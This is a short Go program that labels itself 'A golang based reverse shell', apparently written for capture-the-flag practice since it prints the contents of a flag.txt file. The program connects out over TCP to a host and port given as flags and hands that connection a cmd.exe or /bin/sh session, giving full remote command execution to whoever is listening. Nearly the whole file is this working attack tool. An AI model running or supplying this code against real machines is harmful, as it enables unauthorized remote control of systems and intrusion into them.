package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"runtime" // requirement to access to GOOS

	"github.com/fatih/color"
)

func main() {
	var cmd *exec.Cmd
	flagtext, err := ioutil.ReadFile("flag.txt")
	if err != nil {
		panic(err.Error())
	}
	color.Red("------------------------------------------------\n")
	color.Yellow("A golang based reverse shell\n")
	color.Red("------------------------------------------------\n")
	color.Blue("%s\n", flagtext)
	color.Green("My QQ:1185151867\n")
	color.Green("Blog: https://fdlucifer.github.io/\n")
	color.Red("################################################\n")
	Host := flag.String("host", "input host here", "the host to connect")
	Port := flag.Int("port", 5566, "nc listenling port")
	flag.Parse()
	host := *Host
	port := *Port
	color.Green("*ip:%s------port:&d", host, port)
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		os.Exit(1)
	}
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	default:
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
